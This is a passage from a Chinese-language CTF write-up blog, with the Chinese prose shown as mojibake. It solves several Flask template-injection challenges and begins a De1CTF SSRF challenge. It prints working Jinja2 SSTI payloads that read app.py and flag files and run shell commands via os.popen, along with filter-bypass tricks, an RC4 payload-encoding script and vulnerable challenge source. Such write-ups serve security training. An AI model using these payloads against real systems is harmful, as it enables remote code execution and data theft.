    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç»™äº†ä¸€ä¸ª<code>/shrine/</code>è·¯å¾„ï¼Œè¿‡æ»¤äº†<code>config</code>ã€<code>self</code>ã€<code>()</code></p>
<p>é‚£ä¹ˆæˆ‘ä»¬åŸæ¥æ ¼å¼çš„æ¨¡æ¿æ³¨å…¥å°±ä¸èƒ½ç”¨äº†ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬æƒ³åˆ°äº†å†…ç½®å‡½æ•°<code>get_flashed_messages()</code>ï¼Œåˆåº”ä¸º<code>config</code>åœ¨<code>current_app</code>é‡Œé¢ã€‚</p>
<p>ä¸è¿‡pythonè¿˜æœ‰ä¸€äº›å†…ç½®å‡½æ•°ï¼Œæ¯”å¦‚&#x3D;&#x3D;url_for&#x3D;&#x3D;å’Œ&#x3D;&#x3D;get_flashed_messages&#x3D;&#x3D;</p>
<p>è¦è·å–é…ç½®ä¿¡æ¯ï¼Œå°±å¿…é¡»ä»å®ƒçš„å…¨å±€å˜é‡ï¼ˆè®¿é—®é…ç½® current_app ç­‰)å…¥æ‰‹</p>
<p><code>/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</code></p>
<p><code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p>
<p>or</p>
<p><code>/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p>
<p>æ‹¿åˆ°flag</p>
<hr>
<h4 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h4><p>pinç ï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2553#toc-2">Flask debug pinå®‰å…¨é—®é¢˜ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cbca419ba075">flaskæ¡†æ¶ä¸‹çš„ssti+pinç æ‰§è¡Œå‘½ä»¤ - ç®€ä¹¦ (jianshu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug æ¨¡å¼ PIN ç ç”Ÿæˆæœºåˆ¶å®‰å…¨æ€§ç ”ç©¶ç¬”è®° - HacTF - åšå®¢å›­ (cnblogs.com)</a></p>
<p>è¿™é¢˜åº”è¯¥æ˜¯æ‰¾pinç æ‹¿shell</p>
<p>ä¸‹é¢å†™çš„æ˜¯éé¢„æœŸè§£ï¼š</p>
<p>æ‰“å¼€æ˜¯ä¸€ä¸ªbase64åŠ å¯†è§£å¯†çš„é¡µé¢ï¼Œé¢˜ç›®æ˜¯flaskï¼Œå°è¯•sstiæ³¨å…¥ï¼Œåœ¨è§£å¯†çš„è¾“å…¥æ¡†é‡Œå†™å…¥<code>&#123;&#123;1*7&#125;&#125;</code>çš„base64åŠ å¯†å­—ç¬¦ä¸²ï¼Œå‘ç°å›æ˜¾<code>no no no !!</code>ï¼Œåº”è¯¥æ˜¯æœ‰è¿‡æ»¤ã€‚æ¢æˆ<code>&#123;undefined&#123;1*7&#125;&#125;</code>çš„base64åŠ å¯†å­—ç¬¦ä¸²åˆ™å›æ˜¾7ï¼Œè¯´æ˜ç¡®å®å­˜åœ¨sstiã€‚</p>
<p>å¦å¤–å¦‚æœåœ¨è§£å¯†æ¡†éšä¾¿è¾“å…¥å­—ç¬¦(base64decodeåœ¨ä¸ä¼šè§£æçš„æ—¶å€™å°±ä¼šæŠ¥é”™)ï¼Œä¼šæŠ›å‡ºdebugä¿¡æ¯ï¼Œå‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32138231">Flaskå¼€å¯debugæ¨¡å¼ç­‰äºç»™é»‘å®¢ç•™äº†åé—¨ - çŸ¥ä¹ (zhihu.com)</a></p>
<p>å¯ä»¥è¯»åˆ°éƒ¨åˆ†app.pyä»£ç ã€‚</p>
<p>è¯»å®Œæ•´app.pyçš„payloadï¼ˆè¦æ”¹æˆä¸€è¡Œï¼‰ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;
&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;
&#123;% endif %&#125;&#123;% endfor %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åçŸ¥é“äº†ä¸€ä¸ªè¿‡æ»¤çš„å­—ç¬¦ï¼Œç›´æ¥&#x3D;&#x3D;å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡&#x3D;&#x3D;ã€‚</p>
<p>å…ˆä½¿ç”¨listdiræ–¹æ³•çœ‹çœ‹å½“å‰ç›®å½•æ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å…¶ä¸­this_is_the_flag.txtæœ‰flagå­—æ ·ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•è¯»è¿™ä¸ªæ–‡ä»¶ï¼Œè¿˜æ˜¯é‡‡ç”¨æ‹¼æ¥å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œç„¶åç»“åˆå†…å»ºå‡½æ•°open</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_fl&#39;+&#39;ag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>base64åŠ å¯†åæ”¾å…¥è§£å¯†æ¡†å†…ï¼Œæ‹¿åˆ°flag</p>
<hr>
<h4 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h4><p>F12æœ‰æç¤ºï¼ŒGETä¼ å‚searchã€‚</p>
<p><code>?search=&#123;&#123;1*7&#125;&#125;</code></p>
<p>é¡µé¢æ˜¾ç¤º7ï¼Œè¯´æ˜å­˜åœ¨ssti</p>
<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39; os&#39;].system(&#39;ls&#39;)</code></p>
<p>æ˜¾ç¤º500ï¼Œé¡µé¢é”™è¯¯ï¼Œåº”è¯¥æ˜¯å­˜åœ¨è¿‡æ»¤ã€‚è¿‡æ»¤äº†globalsï¼Œæˆ‘ä»¬ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚</p>
<p><code>[&#39;__glo&#39;+&#39;bals__&#39;]</code></p>
<p>æœ€ç»ˆpayload:</p>
<p><code>?search=&#123;&#123;"".__class__.__bases__[0].__subclasses__()[250].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls /').read()")&#125;&#125;</code></p>
<hr>
<h4 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h4><p>æ‰¾å‚æ•°</p>
<p>æ˜¯name</p>
<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;
&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat .&#x2F;flag.txt&#39;).read()&quot;) &#125;&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h4><p>pyè„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64

<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token string">"init_key"</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token comment"># print("RC4åŠ å¯†ä¸»å‡½æ•°")</span>
  s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
  crypt <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span>  crypt
<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
  s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
  <span class="token comment"># print("åŸæ¥çš„ s ç›’ï¼š%s" % s_box)</span>
  j <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
â€‹    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
â€‹    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
  <span class="token comment"># print("æ··ä¹±åçš„ s ç›’ï¼š%s"% s_box)</span>
  <span class="token keyword">return</span> s_box
<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token comment"># print("è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚")</span>
  res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>
â€‹    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
â€‹    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
â€‹    box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
â€‹    t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
â€‹    k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>
â€‹    res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
  cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s"</span> <span class="token operator">%</span>quote<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token comment">#HereIsTreasureæ˜¯ç§˜é’¥</span>
rc4_main<span class="token punctuation">(</span><span class="token string">"HereIsTreasure"</span><span class="token punctuation">,</span><span class="token string">"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read()&#125;&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">secret?secret&#x3D;.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98&#x2F;%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<hr>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h4 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h4><p>é¢˜ç›®ç»™å‡ºæºç ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python</span>
<span class="token comment">#encoding=utf-8</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> urllib
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> os
<span class="token keyword">import</span> json
<span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>

<span class="token comment">#Taskç±»</span>
<span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#åˆå§‹åŒ–</span>
        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action
        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param
        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign
        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment">#SandBox For Remote_Addr</span>
            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#é€šè¿‡checkSignæ–¹æ³•æ£€æµ‹ç™»å½•</span>
			<span class="token comment">#"scan""read"éƒ½è¦å­˜åœ¨äºactionä¸­ï¼Œæ‰èƒ½æ‰§è¡Œä»¥ä¸‹ä¸¤æ¡if</span>
            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>
                tmpfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>
            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>
                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>
                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>
            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>
        <span class="token keyword">return</span> result
    
    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#å½“æˆ‘ä»¬ä¼ å…¥çš„actionå’Œparamç»è¿‡getSign()å‡½æ•°åå’Œsignç›¸ç­‰å³å¯è¿”å›true</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token comment">#generate Sign For Action Scan.</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#/geneSignè·¯ç”±å¯ä»¥ç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„md5</span>
<span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#getä¼ å‚param</span>
    action <span class="token operator">=</span> <span class="token string">"scan"</span>
    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token comment">#è°ƒç”¨getSign()</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#/De1taè·¯ç”±</span>
<span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#cookiesä¼ å‚action</span>
    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#getä¼ å‚param</span>
    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#cookiesä¼ å‚sign</span>
    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr
    <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>
    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token comment">#ç”¨æˆ‘ä»¬ä¼ ä¸Šå»çš„action,param,signå‚æ•°åŠipæ„é€ Taskç±»å¯¹è±¡</span>
    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#æ‰§è¡ŒTaskç±»å¯¹è±¡çš„Exec</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>
    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span>



<span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#secert_key + param + actionæ‹¼æ¥å†md5</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>
    check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#wafç¦ç”¨gopherå’Œfileåè®®</span>
